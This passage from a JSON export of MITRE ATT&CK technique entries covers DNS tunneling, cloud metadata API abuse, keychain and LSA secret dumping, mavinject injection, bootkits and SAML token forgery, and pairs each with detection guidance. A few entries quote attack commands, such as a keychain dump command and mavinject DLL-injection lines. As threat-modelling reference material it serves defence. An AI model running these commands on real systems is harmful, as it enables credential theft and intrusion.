      "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071.004",
      "stix_id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72",
      "created": "2020-03-15T16:27:31.768000+00:00",
      "modified": "2025-04-15T19:58:10.065000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\n\nMonitor for DNS traffic to/from known-bad or suspicious domains."
    },
    "T1552.005": {
      "id": "T1552.005",
      "name": "Cloud Instance Metadata API",
      "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552.005",
      "stix_id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
      "created": "2020-02-11T18:47:46.619000+00:00",
      "modified": "2025-04-15T22:02:45.218000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Monitor access to the Instance Metadata API and look for anomalous queries.\n\nIt may be possible to detect adversary use of credentials they have obtained such as in [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
    },
    "T1555.002": {
      "id": "T1555.002",
      "name": "Securityd Memory",
      "description": "An adversary with root access may gather credentials by reading `securityd`\u2019s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s `securityd` utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.002",
      "stix_id": "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72",
      "created": "2020-02-12T18:56:31.051000+00:00",
      "modified": "2025-04-15T23:05:25.349000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords."
    },
    "T1615": {
      "id": "T1615",
      "name": "Group Policy Discovery",
      "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1615",
      "stix_id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
      "created": "2021-08-06T13:10:12.916000+00:00",
      "modified": "2025-04-15T22:38:54.812000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "Active Directory: Active Directory Object Access",
        "Process: Process Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.\n\nMonitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed."
    },
    "T1542.003": {
      "id": "T1542.003",
      "name": "Bootkit",
      "description": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nIn BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n\nIn UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1542.003",
      "stix_id": "attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba",
      "created": "2019-12-19T21:05:38.123000+00:00",
      "modified": "2025-04-15T19:58:10.739000+00:00",
      "platforms": [
        "Linux",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Drive: Drive Modification",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis."
    },
    "T1025": {
      "id": "T1025",
      "name": "Data from Removable Media",
      "description": "Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1025",
      "stix_id": "attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec",
      "created": "2017-05-31T21:30:31.584000+00:00",
      "modified": "2025-04-15T19:58:10.837000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1218.013": {
      "id": "T1218.013",
      "name": "Mavinject",
      "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218.013",
      "stix_id": "attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9",
      "created": "2021-09-22T17:45:10.241000+00:00",
      "modified": "2025-04-15T22:48:44.734000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the execution and arguments of mavinject.exe. Compare recent invocations of mavinject.exe with prior history of known good arguments and injected DLLs to determine anomalous and potentially adversarial activity.\n\nAdversaries may rename abusable binaries to evade detections, but the argument <code>INJECTRUNNING</code> is required for mavinject.exe to perform [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001) and may therefore be monitored to alert malicious activity."
    },
    "T1074.001": {
      "id": "T1074.001",
      "name": "Local Data Staging",
      "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1074.001",
      "stix_id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
      "created": "2020-03-13T21:13:10.467000+00:00",
      "modified": "2025-04-15T19:58:11.270000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Windows Registry: Windows Registry Key Modification",
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nConsider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
    },
    "T1036.005": {
      "id": "T1036.005",
      "name": "Match Legitimate Resource Name or Location",
      "description": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. \n\nThis may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.005",
      "stix_id": "attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2",
      "created": "2020-02-10T20:43:10.239000+00:00",
      "modified": "2025-04-15T19:58:11.443000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Image: Image Metadata",
        "Process: Process Metadata",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users."
    },
    "T1587.003": {
      "id": "T1587.003",
      "name": "Digital Certificates",
      "description": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1587.003",
      "stix_id": "attack-pattern--1cec9319-743b-4840-bb65-431547bce82a",
      "created": "2020-10-01T01:42:24.974000+00:00",
      "modified": "2025-04-15T22:18:36.653000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nDetection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)."
    },
    "T1565.001": {
      "id": "T1565.001",
      "name": "Stored Data Manipulation",
      "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1565.001",
      "stix_id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
      "created": "2020-03-02T14:22:24.410000+00:00",
      "modified": "2025-04-15T23:13:20.667000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "File: File Creation",
        "File: File Deletion"
      ],
      "defense_bypassed": [],
      "detection": "Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values."
    },
    "T1110.002": {
      "id": "T1110.002",
      "name": "Password Cracking",
      "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1110.002",
      "stix_id": "attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d",
      "created": "2020-02-11T18:38:56.197000+00:00",
      "modified": "2025-04-15T19:58:11.912000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)."
    },
    "T1114.001": {
      "id": "T1114.001",
      "name": "Local Email Collection",
      "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1114.001",
      "stix_id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004",
      "created": "2020-02-19T18:46:06.098000+00:00",
      "modified": "2025-04-25T14:46:00.964000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1555.001": {
      "id": "T1555.001",
      "name": "Keychain",
      "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555.001",
      "stix_id": "attack-pattern--1eaebf46-e361-4437-bc23-d5d65a3b92e3",
      "created": "2020-02-12T18:55:24.728000+00:00",
      "modified": "2025-04-15T22:44:01.937000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it."
    },
    "T1547": {
      "id": "T1547",
      "name": "Boot or Logon Autostart Execution",
      "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547",
      "stix_id": "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf",
      "created": "2020-01-23T17:46:59.535000+00:00",
      "modified": "2025-04-15T19:58:12.270000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Module: Module Load",
        "Command: Command Execution",
        "File: File Creation",
        "Windows Registry: Windows Registry Key Creation",
        "Windows Registry: Windows Registry Key Modification",
        "File: File Modification",
        "Kernel: Kernel Module Load",
        "Process: Process Creation",
        "Driver: Driver Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation."
    },
    "T1003.004": {
      "id": "T1003.004",
      "name": "LSA Secrets",
      "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.004",
      "stix_id": "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
      "created": "2020-02-21T16:22:09.493000+00:00",
      "modified": "2025-04-15T22:44:50.491000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Access",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
    },
    "T1600": {
      "id": "T1600",
      "name": "Weaken Encryption",
      "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1600",
      "stix_id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
      "created": "2020-10-19T18:47:08.759000+00:00",
      "modified": "2025-04-25T15:15:15.040000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "There is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601). Some detection methods require vendor support to aid in investigation."
    },
    "T1606.002": {
      "id": "T1606.002",
      "name": "SAML Tokens",
      "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",
      "tactic": "credential-access",
      "sub_techniques": [],
